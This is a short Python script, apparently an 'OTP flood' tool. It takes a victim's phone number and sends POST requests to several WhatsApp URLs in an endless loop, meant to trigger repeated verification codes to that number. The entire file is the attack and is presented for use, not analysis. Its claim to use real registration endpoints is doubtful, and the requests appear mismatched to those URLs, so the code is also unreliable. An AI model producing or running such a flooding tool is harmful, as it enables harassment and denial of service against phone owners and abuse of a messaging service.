import requests
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

print(Fore.RED + "=====================================")
print(Fore.GREEN + "   WHATSAPP OTP FLOOD TEST (PY3)")
print(Fore.RED + "=====================================")

country_code = input(Fore.CYAN + "Enter Country Code (e.g. 234): ")
phone_number = input(Fore.CYAN + "Enter Target Number (without country code): ")
full_number = f"+{country_code}{phone_number}"

print(Fore.YELLOW + f"\n[*] Starting flood on {full_number}...")
print(Fore.YELLOW + "[*] Press CTRL+C to stop.\n")

# These are actual endpoints used by WhatsApp registration
urls = [
    "https://v.whatsapp.net/v2/exist",
    "https://api.whatsapp.com/send",
    "https://web.whatsapp.com/send"
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

success = 0
failed = 0

try:
    while True:
        for url in urls:
            try:
                # We are requesting WhatsApp to send an OTP to the number
                payload = {
                    "cc": country_code,
                    "in": phone_number,
                    "to": full_number
                }
                
                response = requests.post(url, data=payload, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    success += 1
                    print(Fore.GREEN + f"[+] Packet sent to {url} | Success: {success}")
                else:
                    failed += 1
                    print(Fore.RED + f"[-] Blocked by {url} | Failed: {failed}")
                    
            except Exception as e:
                failed += 1
                print(Fore.RED + f"[-] Connection Error | Failed: {failed}")
                
        time.sleep(2) # Delay between requests

except KeyboardInterrupt:
    print(Fore.MAGENTA + f"\n\n[!] STOPPED.")
    print(Fore.YELLOW + f"Total Successful Requests: {success}")
    print(Fore.YELLOW + f"Total Failed Requests: {failed}")
    print(Fore.RED + "[!] WhatsApp limits these requests. If it says 'Blocked', the API is protecting the number.")
